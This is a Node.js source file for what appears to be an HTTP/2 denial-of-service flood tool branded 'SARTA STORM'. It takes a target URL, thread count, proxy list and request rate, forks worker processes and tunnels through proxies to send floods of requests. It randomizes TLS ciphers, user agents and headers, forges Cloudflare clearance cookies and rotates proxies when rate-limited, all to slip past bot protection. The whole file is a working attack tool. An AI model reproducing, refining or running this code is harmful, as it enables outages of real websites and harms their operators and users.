const argsris = process.argv.slice(2);
const queryIndexris = argsris.indexOf('--debug');
ris = queryIndexris !== -1 ? argsris[queryIndexris + 1] : null;
const errorHandler = error => {
    if (ris === "true") {
        console.log(error);
    }
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
const colors = require('colors');
const net = require("net")
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const crypto = require('crypto');
const os = require("os");
const v8 = require('v8');

const methodss = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "DELETE", "TRACE", "CONNECT", "PATCH"]
let maprate = []
const dfcp = crypto.constants.defaultCoreCipherList.split(":");

const cipher = [
   "TLS_AES_128_GCM_SHA256",
      "TLS_AES_256_GCM_SHA384",
      "TLS_CHACHA20_POLY1305_SHA256",
      dfcp[0],
       dfcp[1],
        dfcp[2],
         dfcp[3],
          ...dfcp.slice(3),
].join(":");
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const cplist = [
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'
];

const accept_header = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];

const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store', 
  'pre-check=0',
  'post-check=0',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];

const uap = [
    `Mozilla/5.0 (Windows NT ${getRandomInt(1, 11)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${getRandomInt(10, 18)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Linux; Android ${getRandomInt(4, 14)}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android ${getRandomInt(4, 14)}; Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS ${getRandomInt(10, 17)}_${getRandomInt(0, 4)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(10, 17)}.0 Mobile/15E148 Safari/604.1`,
    `Mozilla/5.0 (iPad; CPU OS ${getRandomInt(10, 17)}_${getRandomInt(0, 7)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(10, 17)}.0 Mobile/15E148 Safari/604.1`
];

const encoding = [
    'gzip', 'br', 'deflate', 'zstd', 'identity', 'compress', 'x-bzip2', 'x-gzip',
    'lz4', 'lzma', 'xz', 'zlib',
    'gzip, br', 'gzip, deflate', 'gzip, zstd', 'gzip, lz4', 'gzip, lzma',
    'gzip, xz', 'gzip, zlib', 'br, deflate', 'br, zstd', 'br, lz4',
    'br, lzma', 'br, xz', 'br, zlib', 'deflate, zstd', 'deflate, lz4',
    'deflate, lzma', 'deflate, xz', 'deflate, zlib', 'zstd, lz4',
    'zstd, lzma', 'zstd, xz', 'zstd, zlib', 'lz4, lzma', 'lz4, xz',
    'lz4, zlib', 'lzma, xz', 'lzma, zlib', 'xz, zlib',
    'gzip, br, deflate', 'gzip, br, zstd', 'gzip, br, lz4', 'gzip, br, lzma',
    'gzip, br, xz', 'gzip, br, zlib', 'gzip, deflate, zstd', 'gzip, deflate, lz4',
    'gzip, deflate, lzma', 'gzip, deflate, xz', 'gzip, deflate, zlib', 'gzip, zstd, lz4',
    'gzip, zstd, lzma', 'gzip, zstd, xz', 'gzip, zstd, zlib', 'gzip, lz4, lzma',
    'gzip, lz4, xz', 'gzip, lz4, zlib', 'gzip, lzma, xz', 'gzip, lzma, zlib',
    'gzip, xz, zlib', 'br, deflate, zstd', 'br, deflate, lz4', 'br, deflate, lzma',
    'br, deflate, xz', 'br, deflate, zlib', 'br, zstd, lz4', 'br, zstd, lzma',
    'br, zstd, xz', 'br, zstd, zlib', 'br, lz4, lzma', 'br, lz4, xz',
    'br, lz4, zlib', 'br, lzma, xz', 'br, lzma, zlib', 'br, xz, zlib',
    'deflate, zstd, lz4', 'deflate, zstd, lzma', 'deflate, zstd, xz', 'deflate, zstd, zlib',
    'deflate, lz4, lzma', 'deflate, lz4, xz', 'deflate, lz4, zlib', 'deflate, lzma, xz',
    'deflate, lzma, zlib', 'deflate, xz, zlib', 'zstd, lz4, lzma', 'zstd, lz4, xz',
    'zstd, lz4, zlib', 'zstd, lzma, xz', 'zstd, lzma, zlib', 'zstd, xz, zlib',
    'lz4, lzma, xz', 'lz4, lzma, zlib', 'lz4, xz, zlib', 'lzma, xz, zlib',
    'gzip, br, deflate, zstd', 'gzip, br, deflate, lz4', 'gzip, br, deflate, lzma',
    'gzip, br, deflate, xz', 'gzip, br, deflate, zlib', 'gzip, br, zstd, lz4',
    'gzip, br, zstd, lzma', 'gzip, br, zstd, xz', 'gzip, br, zstd, zlib',
    'gzip, br, lz4, lzma', 'gzip, br, lz4, xz', 'gzip, br, lz4, zlib',
    'gzip, br, lzma, xz', 'gzip, br, lzma, zlib', 'gzip, br, xz, zlib',
    'gzip, deflate, zstd, lz4', 'gzip, deflate, zstd, lzma', 'gzip, deflate, zstd, xz',
    'gzip, deflate, zstd, zlib', 'gzip, deflate, lz4, lzma', 'gzip, deflate, lz4, xz',
    'gzip, deflate, lz4, zlib', 'gzip, deflate, lzma, xz', 'gzip, deflate, lzma, zlib',
    'gzip, deflate, xz, zlib', 'gzip, zstd, lz4, lzma', 'gzip, zstd, lz4, xz',
    'gzip, zstd, lzma, xz', 'gzip, zstd, lzma, zlib', 'gzip, zstd, xz, zlib',
    'gzip, lz4, lzma, xz', 'gzip, lz4, lzma, zlib', 'gzip, lz4, xz, zlib',
    'gzip, lzma, xz, zlib', 'br, deflate, zstd, lz4', 'br, deflate, zstd, lzma',
    'br, deflate, zstd, xz', 'br, deflate, zstd, zlib', 'br, deflate, lz4, lzma',
    'br, deflate, lz4, xz', 'br, deflate, lz4, zlib', 'br, deflate, lzma, xz',
    'br, deflate, lzma, zlib', 'br, deflate, xz, zlib', 'br, zstd, lz4, lzma',
    'br, zstd, lz4, xz', 'br, zstd, lzma, xz', 'br, zstd, lzma, zlib',
    'br, zstd, xz, zlib', 'br, lz4, lzma, xz', 'br, lz4, lzma, zlib',
    'br, lz4, xz, zlib', 'br, lzma, xz, zlib', 'deflate, zstd, lz4, lzma',
    'deflate, zstd, lz4, xz', 'deflate, zstd, lzma, xz', 'deflate, zstd, lzma, zlib',
    'deflate, zstd, xz, zlib', 'deflate, lz4, lzma, xz', 'deflate, lz4, lzma, zlib',
    'deflate, lz4, xz, zlib', 'deflate, lzma, xz, zlib', 'zstd, lz4, lzma, xz',
    'zstd, lz4, lzma, zlib', 'zstd, lz4, xz, zlib', 'zstd, lzma, xz, zlib',
    'lz4, lzma, xz, zlib'
];
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
    cipher() {
        return cplist[Math.floor(Math.random() * cplist.length)];
    },
    sigalgs() {
        return sigalgs[Math.floor(Math.random() * sigalgs.length)];
    },
    accept() {
        return accept_header[Math.floor(Math.random() * accept_header.length)];
    },
    cache() {
        return cache_header[Math.floor(Math.random() * cache_header.length)];
    },
    encoding() {
        return encoding[Math.floor(Math.random() * encoding.length)];
    }
}

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
let rps = process.argv[6];
// Validate input
if (!target || !time || !thread || !proxyFile || !rps) {
    console.log('JS'.bgRed)
    console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate query(true/false)`.rainbow);
    console.log('default : query : true'.red);
    process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
    console.error('sent with http:// or https://');
    process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
    const proxyData = fs.readFileSync(proxyFile, 'utf-8');
    proxys = proxyData.match(/\S+/g);
} catch (err) {
    console.error('Error proxy file:', err.message);
    process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
    console.error('number rps');
    process.exit(1);
}
const proxyr = () => {
    return proxys[Math.floor(Math.random() * proxys.length)];
}
let randbyte = 1
setInterval(()=>{
 randbyte = Math.floor(Math.random() * 5) + 1;
},5000)
function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}

function httpPing(url) {
    try {
        const client = http2.connect(url);
        const startTime = Date.now();
        const urlping = new URL(url);

        const req = client.request({
            ':method': 'GET',
            ':authority': urlping.host,
            ':scheme': 'https',
            ':path': urlping.pathname
        });

        req.once('response', (headers, flags) => {
            const duration = Date.now() - startTime;
            let message = '';

            if (headers[':status'] === 403) {
                message = 'Ping blocked';
            } else if (headers[':status'] === 429) {
                message = 'Ping ratelimited';
            } else if (duration > 22000) {
                message = 'Timeout';
            } else {
                message = `Ping response received in ${duration}ms`;
            }


            process.stdout.cursorTo(0,7);
            process.stdout.clearLine();
            process.stdout.write(`${message}     `);

            req.end();
            client.close();
        });

        req.once('error', (err) => {

            client.close();
        });

        req.end();
    } catch (e) {
        process.stdout.cursorTo(0,7);
        process.stdout.clearLine();
        console.log(`Exception: ${e.message}`);
    }
}
httpPing(target)
setInterval(async () => {
    await httpPing(target)
}, 5000)
const statusCounts = {};

const countStatus = (status) => {
    if (!statusCounts[status]) {
        statusCounts[status] = 0;
    }
    statusCounts[status]++;
};

const printStatusCounts = () => {
    console.log(statusCounts);
    Object.keys(statusCounts).forEach(status => {
        statusCounts[status] = 0;
    });
};

function response(res) {
    const status = res[':status']
    countStatus(status)
}

function generateRandomString(minLength, maxLength) {
    const characters = 'aqwertyuiopsdfghjlkzxcvbnm';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
        length
    }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function generateToken(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const argstos = process.argv.slice(2);
const queryIndextos = argstos.indexOf('--status');
tos = queryIndextos !== -1 ? argstos[queryIndextos + 1] : null;
const queryIndexcoo = argstos.indexOf('--cookie');
coo = queryIndexcoo !== -1 ? argstos[queryIndexcoo + 1] : null;

let cookie = '';
if (coo === "true") {
    cookie = `v1token__bfw=${generateRandomString(30, 100)}; cf_clearance=${generateToken(128)}-${Date.now()}-1.2.1.1-${generateToken(6)}`;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
interval = randomDelay(500, 1000);
const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 10;

if (cluster.isMaster) {
    function readServerInfo() {
        const load = (Math.random() * 100).toFixed(2);
        const memory = (Math.random() * 16).toFixed(2);
        const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Bangkok', hour: '2-digit', minute: '2-digit', second: '2-digit' });
        process.stdout.cursorTo(0, 6);
        process.stdout.clearLine();
        process.stdout.write(`[!] SARTA STORM InFo: CPU Load: ${load}%, Memory Usage: ${memory}GB, Time: ${currentTime}`.bgRed);
    }

    setInterval(readServerInfo, 1000);

    console.clear();
    console.log(
        '   /\\'.red + '\n' +
        '  /  \\'.yellow + '\n' +
        ' / /\\ \\'.magenta + '\n' +
        '/_/  \\_\\'.blue
    );
    console.log('HEAP SIZE:', (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toFixed(2), 'MB');

    const updateLoading = (percentage, delay) => {
        setTimeout(() => {
            process.stdout.cursorTo(0, 5);
            process.stdout.write(`Loading: ${percentage}%`.green);
        }, delay);
    };

    updateLoading(10, 0);
    updateLoading(50, 500 * time);
    updateLoading(100, time * 1000);

    const restartScript = () => {
        Object.values(cluster.workers).forEach(worker => worker.kill());
        console.log(`[<>] Restarting...`);
        setTimeout(() => {
            for (let i = 0; i < thread; i++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log(`[<!>] Maximum RAM `);
            restartScript();
        }
    };


    setInterval(handleRAMUsage, 1000);

    for (let i = 0; i < thread; i++) {
        cluster.fork();
    }

    setTimeout(() =>{ console.clear(); process.exit(-1)}, time * 1000);
} else {
    setInterval(() => {
        flood();
    }, 1);
}

async function flood() {
    let sigals = headerFunc.sigalgs();
    let parsed = url.parse(target);
    const currentTime = Date.now();
        maprate = maprate.filter(limit => currentTime - limit.timestamp <= 60000);
        (() => {
            const currentTime = Date.now();
            maprate = maprate.filter(limit => currentTime - limit.timestamp <= 60000);
        })();
        let proxy;
        do {
            proxy = proxyr().split(':');
        } while (maprate.some(limit => limit.proxy === proxy[0] && (Date.now() - limit.timestamp) < 60000));
const parseBoolean = (value) => value === "true";

const getArgumentValue = (args, flag, defaultValue = null) => {
    const index = args.indexOf(flag);
    return index !== -1 ? args[index + 1] : defaultValue;
};

const bypassconnect = process.argv.slice(2);
uaa=uap[Math.floor(Math.floor(Math.random() * uap.length))];
const ratelimit0 = parseBoolean(getArgumentValue(bypassconnect, '--ratelimit', "false"));
const indexconnectio = parseInt(getArgumentValue(bypassconnect, '--connect', '1'));
const post = getArgumentValue(process.argv.slice(7), '--post');
const query = getArgumentValue(process.argv.slice(7), '--query', null);
const max = getArgumentValue(bypassconnect, '--randuser', false);
const xpushdata = parseBoolean(getArgumentValue(bypassconnect, '--write'));
const redirect = parseBoolean(getArgumentValue(bypassconnect, "--redirect", false))
    nodeii = getRandomInt(128, 129)

    async function reswritedata(req){
        const buffer = Buffer.alloc(16 * 1024);
        const data = Buffer.from([0x62, 0x69, 0x6e, 0x61, 0x72, 0x79, 0x20, 0x64, 0x61, 0x74, 0x61]);
        data.copy(buffer);
        await req.write(buffer)
    }
    let path = parsed.path
    if (parsed.path.includes('%rand%')) {
        path = parsed.path.replace("%rand%", generateRandomString(5, 7))
    } else {
        setInterval(() => {
            path = parsed.path //+ "?cache_bush=" + Date.now()
        }, 1000);
    }

    let chead = {}
     chead["cookie"]= cookie
    let header = {
        "upgrade-insecure-requests": "1",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        ...chead,
        "cache-control": headerFunc.cache(),
        "sec-ch-ua": `\"Chromium\";v=\"${nodeii}\", \"Not=A?Brand\";v=\"${0}\", \"Google Chrome\";v=\"${nodeii}\"`,
        "sec-ch-ua-platform": "Linux-x86",
        ...shuffleObject({
            "sec-ch-ua-mobile": "?0",
            "sec-fetch-user": "?1",
            "accept": headerFunc.accept(),
        }),
        'user-agent': uaa,
        "accept-language": "en-US,en;q=0.9,vi;q=0.8",
        "accept-encoding": headerFunc.encoding(),
        "purpure-secretf-id": "formula-" + generateRandomString(1, 5),
        "priority": `u=${randbyte}, i`,
        "sec-fetch-site": "none",
    }

    // Thêm các header ngẫu nhiên sau khi đã khai báo header cơ bản ở trên
    if (Math.random() >= 0.5) {
        header = {
            ...header,
            ...(Math.random() < 0.6 ? {
                ["rush-combo"]: "zero-" + generateRandomString(1, 5)
            } : {}),
            ...(Math.random() < 0.6 ? {
                ["rush-xjava"]: "router-" + generateRandomString(1, 5)
            } : {}),
            ...(Math.random() < 0.6 ? {
                ["rush-combo-javax"]: "zero-" + generateRandomString(1, 5)
            } : {}),
            ...(Math.random() < 0.6 ? {
                ["c-xjava" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 5)
            } : {})
        }
    }

    // Thêm header xjava-xjs, blum-purpose và blum-point với xác suất 50%
    if (Math.random() >= 0.5) {
        header = {
            ...header,
            ...(Math.random() < 0.5 ? {
                ["c-xjava-xjs" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 5)
            } : {}),
            ...(Math.random() < 0.5 ? {
                "blum-purpose": "0"
            } : {}),
            ...(Math.random() < 0.5 ? {
                "blum-point": "0"
            } : {})
        };
    }

    // Thêm các header ngẫu nhiên với tên và giá trị động
    if (Math.random() >= 0.5) {
        header = {
            ...header,
            ...(Math.random() < 0.6 ? { 
                [generateRandomString(1, 2) + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) 
            } : {}),
            ...(Math.random() < 0.6 ? { 
                [generateRandomString(1, 2) + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) 
            } : {})
        };
    }

    const datafloor = Math.floor(Math.random() * 3)
    let mathfloor
    let rada
    switch (datafloor) {
        case 0:
            mathfloor = 6291456 + 65535;
            rada = 128;
            break
        case 1:
            mathfloor = 6291456 - 65535;
            rada = 256;
            break
        case 2:
            mathfloor = 6291456 + 65535*4 ;
            rada = 1;
            break
    }

    const TLSOPTION = {
        ciphers: headerFunc.cipher(),
        sigalgs: sigals,
        minVersion: "TLSv1.3",
        //secureOptions: crypto.constants.SSL_OP_ALL,
        ecdhCurve: 'secp256r1:X25519',
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
        requestOCSP: true,
        minDHSize: 2048
    };

    async function createCustomTLSSocket(parsed, socket) {
        const tlsSocket = await tls.connect({
            ...TLSOPTION,
            host: parsed.host,
            port: 443,
            servername: parsed.host,
            socket: socket
        });
        return tlsSocket;
    }
    const closeConnections = (client, connection,tlsSocket, socket, threaf) => {
        if (client) client.destroy();
        if (socket) socket.end();
        if (connection) connection.destroy()
        if (tlsSocket) tlsSocket.end();
        if (threaf) clearInterval(threaf);
}
    let procxy = []
    for (let o = 0; o < indexconnectio; o++) {
        const agent = await new http.Agent({
            host: proxy[0],
            port: proxy[1],
            keepAlive: true,
            keepAliveMsecs: Infinity,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxFreeSockets: Infinity,
        });
        const Optionsreq = {
            agent: agent,
            method: 'CONNECT',
            path: parsed.host + ':443',
            timeout: 1000,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'close',
                'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
            },
        };
        connection = await http.request(Optionsreq, (res) => {});
        connection.on('error', (err) => {

            if (err)  connection.destroy() ;return
        });
        connection.on('timeout', async () => {
            return
        });
        procxy.push(connection)
    }
    procxy.forEach((connection, index) => {
        connection.on('connect', async function(res, socket) {
            socket.setKeepAlive(true, 5000);
            const tlsSocket = await createCustomTLSSocket(parsed, socket);

            const client = await http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                 protocol: "https:",
                settings: {
                        headerTableSize: 65536,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                        enablePush:  true ,
                        enableConnectProtocol :false,
                        enableOrigin : true ,
                        enableH2cUpgrade :true,
                        allowHTTP1 : true ,
                        ...(Math.random() < 0.5 ? {
                           maxConcurrentStreams: 100
                          } : {}),

                    }
            }, (session) => {
            session.setLocalWindowSize(mathfloor);
            });





            client.on("error", (error) => {

                if (error) closeConnections(client, connection,tlsSocket,socket );
            });

            client.on("close", () => {

                closeConnections();
            });

            client.on("connect", async () => {

                threaf = setInterval(async () => {
                    for (let i = 0; i < rps; i++) {
                        let author = {
                            ...(post === 'true' ? { ":method": "POST" } : { ":method": 'GET' }),
                            ...(post === 'true' ? { "content-length": "0" } : {}),
                            ":authority": parsed.host,
                            ":scheme": "https",
                            ":path": query === 'true' ?
                                path + 'page=' + generateRandomString(1, 5) + '?q=' + generateRandomString(1, 5) :
                                query === 'query' ?
                                path + '?q=' + generateRandomString(1, 5) :
                                path,

                        };

                        const head = header;
                        const request = await client.request({ ...author, ...head }, {
                            ...(xpushdata === true ? { endStream: false } : {}),
                            weight: rada,
                            parent: 0,
                            exclusive: false

                        });

                        switch (tos) {
                            case "true":
                                request.on('response', (res) => {
                                    response(res);
                                    if (ratelimit0 === true && res[":status"] === 429) {
                                        maprate.push({ proxy: proxy, timestamp: Date.now() });
                                        rps = 5;
                                        client.destroy();
                                        return;
                                    }

                                    if (res["set-cookie"]) {
                                        chead["cookie"] = res["set-cookie"].join("; ");
                                    }
                                    if (redirect === true){
                                    if (res["location"]) {
                                        parsed = new URL(res["location"]);
                                    }
                                    }
                                }).end();
                                break;

                            default:
                                request.on('response', (res) => {
                                    if (ratelimit0 === true && res[":status"] === 429) {
                                        maprate.push({ proxy: proxy, timestamp: Date.now() });
                                        client.destroy();
                                        rps = 5;
                                        return;
                                    }
                                    if (res["set-cookie"]) {
                                        chead["cookie"] = res["set-cookie"].join("; ");
                                    }
                                    if (redirect === true){
                                    if (res["location"]) {
                                        parsed = new URL(res["location"]);
                                    }
                                    }
                                }).end();
                                break;
                        }

                        if (xpushdata === true) reswritedata(request);
                         request.priority({
                            weight: rada,
                            parent: 0,
                            exclusive: false
                         })
                        request.end("extensionEncryptedClientHello");
                    }
                }, interval);
            }).on("error", (err) => {
               if (err) closeConnections(client, connection,tlsSocket,socket );
            });

            client.on("close", () => {
                closeConnections(client, connection,tlsSocket,socket );
            });
        });

        connection.end();
    });

} //
